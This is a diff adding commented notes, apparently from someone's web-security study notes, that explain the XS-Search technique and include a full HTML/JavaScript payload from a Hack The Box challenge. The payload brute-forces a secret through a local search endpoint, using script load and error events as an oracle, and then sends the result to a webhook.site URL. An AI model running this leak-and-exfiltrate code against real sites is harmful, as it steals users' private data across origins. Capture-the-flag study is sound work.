@@ -54,3 +54,41 @@
 // so for example if an xss found in a trusted website by an internal service
 // an attacker can go far because usually interal server don't get that much security
 // because it's not exposed to the internet
+//* Xs-Search
+// in here we are using the fact that script.src=url
+// if the response is 200 OK the onload event will be triggered
+// and if the response is 404 Not Found the onerror event will be triggered
+// even though we can't see the result of the request
+// <body>
+// <html>
+// <script type="text/javascript">
+//     flag_charset =
+//       "}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$()*,-[]_}";
+//     var flag = "HTB{";
+//     var charIndex = 0;
+//     const bruteForce = () => {
+//       var script = document.createElement("script");
+//       script.src = `//127.0.0.1:1337/api/entries/search?q=${flag}${flag_charset.charAt(charIndex)}`;
+//       document.body.appendChild(script);
+//       script.onload = () => {
+//         flag += flag_charset.charAt(charIndex);
+//         charIndex = 0;
+//         script.parentNode.removeChild(script);
+//         if (flag.slice(-1) != '}') {
+//           bruteForce();
+//         }
+//         else {
+//           img = new Image();
+//           img.src = 'http://webhook.site/6172d550-9833-4c2c-8805-4eec6c4f69f3?flag=' + flag;
+//         }
+//       }
+//       script.onerror = () => {
+//         script.parentNode.removeChild(script);
+//         charIndex += 1;
+//         bruteForce();
+//       }
+//     }
+//     bruteForce();
+//   </script>
+// </body>
+// </html>
